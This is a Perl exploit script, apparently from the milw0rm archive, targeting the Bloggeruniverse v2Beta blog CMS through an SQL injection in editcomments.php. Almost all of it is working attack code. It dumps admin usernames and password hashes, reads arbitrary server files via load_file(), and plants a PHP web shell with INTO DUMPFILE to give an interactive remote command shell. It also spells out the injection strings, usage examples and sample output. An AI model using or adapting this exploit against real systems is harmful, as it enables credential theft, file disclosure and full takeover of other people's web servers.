#!/usr/bin/perl

# |----------------------------------------------------------------------------------------------------------------------------------|
# |                     INFORMATIONS                                                                                                 |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |Web Application :  Bloggeruniverse v2Beta                                                                                         |
# |Download        :  http://garr.dl.sourceforge.net/sourceforge/bloggeruniverse/bloggeruniverse-beta2.zip                           |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |Remote Exploit (Admin credentials extract + File Disclosure + Remote Command Execution via Sql Injection)                         |
# |by Osirys                                                                                                                         |
# |osirys[at]autistici[dot]org                                                                                                       |
# |osirys.org                                                                                                                        |
# |Greets to: evilsocket, Fireshot, Todd and str0ke                                                                                  |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |BUG [Sql Injection]
# |  p0c : /[path]/editcomments.php?id=[sql_string]
# |  There are other sql injections, find them by yourself ;)
# |[!] This Blog system doesn't cheek if install.php file still exists after installation ! ;)
# |SQL Injections used by this sploit :
# |[1] /path]/editcomments.php?id=-2 union all select 1,2,3,4,5,6,concat(username,0x3a,password),8 from users
# |[2] /path]/editcomments.php?id=-2 union all select 1,2,3,4,5,6,load_file('lf'),8
# |[3] /path]/editcomments.php?id=-2 union all select 1,2,3,4,5,6,'content',8 into dumpfile 'path'
# |----------------------------------------------------------------------------------------------------------------------------------|
# |This CMS is vulnerable to sql injection. This simple exploit just uses the sql bug to get admin credentials (username,password),
# |uses load_file() mysql function to disclosure local file on the server, uses the '' into dumpfile '' mysql function to save a
# |php shell on the website, so it will allows you to execute commands.
# |The RCE way is more difficult, becouse you need to know the site's path on the server, dumpfile function needs it !
# |I'm trying to find an universal way to find the cwd of the site in the server from sql injection, still nothing. Would be good a
# |LFI bug, so then we could write our file into /tmp, and then include it via LFI.
# |----------------------------------------------------------------------------------------------------------------------------------|

# Pastin' here output of all exploiting way of this sploit will be too long, here the first way :  Admin credentials extract
# -----------------------------------------------------------------------------------------------------------------------------------|
# Exploit in action [>!]
# -----------------------------------------------------------------------------------------------------------------------------------|
# osirys[~]>$ perl p0w.txt http://localhost/bloggeruniverse-beta2/ admin_hash
#
#   --------------------------------------
#       Bloggeruniverse Remote Exploit
#              Coded by Osirys
#   -------------------------------------
#
# [*] Extracting admin credentials via Sql Injection ..
# [*] Username: admin
# [*] Password: 5f4dcc3b5aa765d61d8327deb882cf99
#
# osirys[~]>
# -----------------------------------------------------------------------------------------------------------------------------------|

use LWP::UserAgent;
use HTTP::Request::Common;

my $host   = $ARGV[0];
my $expl   = $ARGV[1];
my $fpath  = $ARGV[2];

my $sql_inj_path = "/editcomments.php?id=";
my $gen_sql_inj  = "-2 union all select 1,2,3,4,5,6,";
my $php_c0de     = "<?php echo \"st4rt\";if(get_magic_quotes_gpc()){ \$_GET[".
                   "cmd]=stripslashes(\$_GET[cmd]);} system(\$_GET[cmd]);?>";

$fpath = "/x" if ($expl =~ /file_disc/);
$fpath = "/x" if ($expl =~ /admin_hash/);
($host,$expl,$fpath) || help("-1");
cheek($host,$expl,$fpath) == 1 || help("-2");
&banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

&adm_hash if $expl_way == 1;
&file_discl if $expl_way == 2;
&cmd if $expl_way == 3;

sub adm_hash {
    print "[*] Extracting admin credentials via Sql Injection ..\n";
    my $sql_inj = $sql_inj_path.$gen_sql_inj."concat(username,0x3a,password),8 from users";
    my $attack  = $host.$sql_inj;
    my $re = get_req($attack);
    my $content = tag($re);
    if ($content =~ /name="comment">([a-zA-Z0-9-_.]{2,15}):([a-f0-9]{32})<\/textarea>/) {
        print "[*] Username: $1\n";
        print "[*] Password: $2\n\n";
        exit(0);
    }
    else {
        print "[-] Can't extract admin credentials\n[-] Exploit Failed !\n\n";
        exit(0);
    }
}

sub file_discl {
    print "[*] cat ";
    my $file = <STDIN>;
    chomp($file);
    $file !~ /exit/ || die "[-] Quitting ..\n";
    if ($file !~ /\/(.*)/) {
        print "\n[-] Bad filename !\n";
        &file_discl;
    }
    my $sql_inj = $sql_inj_path.$gen_sql_inj."load_file(\"".$file."\"),8";
    my $attack  = $host.$sql_inj;
    my $re = get_req($attack);
    my $content = tag($re);
    if ($content =~ /name="comment">(.+)<\/textarea>\*\*\*\*\*\*<\/td>/) {
        my $out = $1;
        $out =~ s/\$/ /g;
        $out =~ s/\*/\n/g;
        $out =~ s/$out/$out\n/ if ($out !~ /\n$/);
        print "$out\n";
        &file_discl;
    }
    elsif ($content =~ /name="comment"><\/textarea>\*\*\*\*\*\*<\/td>/) {
        $c++;
        print "[-] Can't find ".$file." \n";
        $c < 3 || die "[-] File Disclosure failed !\n[-] Something wrong. Exploit Failed !\n\n";
        &file_discl;
    }
}

sub cmd {
    print "[*] Injectin php shell via Sql Injection\n";
    my $sql_inj = $sql_inj_path.$gen_sql_inj."'".$php_c0de."',8 into dumpfile '".$fpath."/shell.php'";
    my $attack  = $host.$sql_inj;
    get_req($attack);
    my $test = get_req($host."shell.php");
    if ($test =~ /st4rt/) {
        print "[*] Shell succesfully injected !\n";
        print "[&] Hi my master, do your job now [!]\n\n";
        $exec_path = $host."/shell.php";
        &exec_cmd;
    }
    else {
        print "[-] Shell not found \n[-] Exploit failed\n\n";
        exit(0);
    }
}

sub exec_cmd() {
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print "shell[$h0st]\$> ";
    my $cmd = <STDIN>;
    $cmd !~ /exit/ || die "[-] Quitting ..\n";
    my $exec_url = $exec_path."?cmd=".$cmd;
    my $re = get_req($exec_url);
    my $content = tag($re);
    if ($content =~ /st4rt(.+)8/) {
        my $out = $1;
        $out =~ s/\$/ /g;
        $out =~ s/\*/\n/g;
        $out =~ s/8//g;
        chomp($out);
        print "$out\n";
        &exec_cmd;
    }
    else {
        $c++;
        $cmd =~ s/\n//;
        print "bash: ".$cmd.": command not found\n";
        $c < 3 || die "[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n";
        &exec_cmd;
    }

}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st." ".$path;
    return $full_det;
}

sub tag() {
    my $string = $_[0];
    $string =~ s/ /\$/g;
    $string =~ s/\s/\*/g;
    return($string);
}

sub cheek() {
    my $host  = $_[0];
    my $expl  = $_[1];
    my $fpath = $_[2];
    if ($host =~ /http:\/\/(.*)/) {
        $ch_host = 1;
    }
    if ($expl =~ /admin_hash/) {
        $ch_expl = 1;
        $ch_fpath = 1;
        $expl_way = 1;
    }
    elsif ($expl =~ /file_disc/) {
        $ch_expl = 1;
        $ch_fpath = 1;
        $expl_way = 2;
    }
    elsif ($expl =~ /cmd/) {
        $ch_expl = 1;
        $expl_way = 3;
    }
    if ($fpath =~ /\/(.*)/) {
        $ch_fpath = 1;
    }
    return 1 if ((($ch_host)&&($ch_expl)&&($ch_fpath)) == 1);
    &help("-2");
}

sub banner {
    print "\n".
          "  --------------------------------------\n".
          "      Bloggeruniverse Remote Exploit    \n".
          "             Coded by Osirys            \n".
          "  ------------------------------------- \n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Input Error, missed some arguments !\n\n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad arguments !\n\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path admin_hash\n";
    print "    Ex:     perl $0 http://site.it/cms/      admin_hash\n";
    print "[*] Usage : perl $0 http://hostname/cms_path file_disc\n";
    print "    Ex:     perl $0 http://site.it/cms/      file_disc\n";
    print "[*] Usage : perl $0 http://hostname/cms_path cmd path_of_site\n";
    print "    Ex:     perl $0 http://site.it/cms/      cmd /home/osirys/web/cms/\n\n";
    exit(0);
}

# milw0rm.com [2009-02-11]